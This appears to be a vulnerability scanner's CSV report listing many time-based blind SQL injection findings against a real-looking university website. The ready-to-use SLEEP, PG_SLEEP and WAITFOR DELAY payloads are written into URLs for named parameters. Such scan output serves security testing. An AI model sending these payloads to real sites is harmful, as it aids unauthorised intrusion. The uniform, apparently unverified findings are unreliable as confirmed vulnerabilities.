Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/tbi/?cmd=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/tbi/?q=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/tbi/?file=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/tbi/?id=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/tbi/?query=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/bus-schedule/?search=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/bus-schedule/?query=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/bus-schedule/?cmd=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/bus-schedule/?q=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/bus-schedule/?file=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/bus-schedule/?page=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/bus-schedule/?search=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/bus-schedule/?query=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/bus-schedule/?page=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/bus-schedule/?search=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/bus-schedule/?file=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/bus-schedule/?search=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/bus-schedule/?cmd=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/bus-schedule/?q=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/bus-schedule/?q=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/bus-schedule/?page=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/bus-schedule/?id=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/bus-schedule/?id=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/bus-schedule/?query=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/bus-schedule/?id=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/bus-schedule/?cmd=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/bus-schedule/?cmd=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/bus-schedule/?q=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/bus-schedule/?query=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/bus-schedule/?page=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/bus-schedule/?file=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/bus-schedule/?search=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/bus-schedule/?q=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/bus-schedule/?id=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/bus-schedule/?id=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/bus-schedule/?page=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/bus-schedule/?cmd=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/bus-schedule/?file=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/bus-schedule/?file=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/bus-schedule/?file=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/bus-schedule/?query=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/bus-schedule/?id=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/bus-schedule/?cmd=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/bus-schedule/?page=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/bus-schedule/?query=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/bus-schedule/?q=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/bus-schedule/?file=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/bus-schedule/?search=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/bus-schedule/?search=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/bus-schedule/?id=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/bus-schedule/?query=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/bus-schedule/?page=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/bus-schedule/?page=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/bus-schedule/?cmd=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/bus-schedule/?id=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/bus-schedule/?query=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/bus-schedule/?search=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/bus-schedule/?q=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/bus-schedule/?cmd=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/bus-schedule/?file=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/bus-schedule/?cmd=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/bus-schedule/?page=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/bus-schedule/?query=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/bus-schedule/?cmd=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/bus-schedule/?search=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/bus-schedule/?q=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/bus-schedule/?page=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/bus-schedule/?file=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/bus-schedule/?search=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/bus-schedule/?q=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/bus-schedule/?file=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/bus-schedule/?query=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/bus-schedule/?id=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/bus-schedule/?id=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/bus-schedule/?q=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?id=1%27+AND+SLEEP%285%29--#1574016421299-0f63f841-e7fb),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?id=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016421299-0f63f841-e7fb),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?id=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016421299-0f63f841-e7fb),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?search=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016421299-0f63f841-e7fb),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?q=1%27+AND+SLEEP%285%29--#1574016421299-0f63f841-e7fb),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?search=1%27+AND+SLEEP%285%29--#1574016421299-0f63f841-e7fb),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?file=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016421299-0f63f841-e7fb),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?q=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016421299-0f63f841-e7fb),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?cmd=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016421299-0f63f841-e7fb),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?query=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016421299-0f63f841-e7fb),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?page=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016421299-0f63f841-e7fb),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?id=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574016421299-0f63f841-e7fb),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?cmd=1+OR+SLEEP%285%29#1574016421299-0f63f841-e7fb),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?search=1%22+AND+SLEEP%285%29--#1574016421299-0f63f841-e7fb),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?query=1%22+AND+SLEEP%285%29--#1574016421299-0f63f841-e7fb),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?id=1+OR+SLEEP%285%29#1574016421299-0f63f841-e7fb),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?file=1+OR+SLEEP%285%29#1574016421299-0f63f841-e7fb),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?id=1%22+AND+SLEEP%285%29--#1574016421299-0f63f841-e7fb),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?query=1+OR+SLEEP%285%29#1574016421299-0f63f841-e7fb),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?q=1+OR+SLEEP%285%29#1574016421299-0f63f841-e7fb),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?search=1+OR+SLEEP%285%29#1574016421299-0f63f841-e7fb),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?query=1%27+AND+PG_SLEEP%285%29--#1574016421299-0f63f841-e7fb),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?search=1%27+AND+PG_SLEEP%285%29--#1574016421299-0f63f841-e7fb),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?q=1%22+AND+SLEEP%285%29--#1574016421299-0f63f841-e7fb),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?cmd=1%27+AND+PG_SLEEP%285%29--#1574016421299-0f63f841-e7fb),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?page=1+OR+SLEEP%285%29#1574016421299-0f63f841-e7fb),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
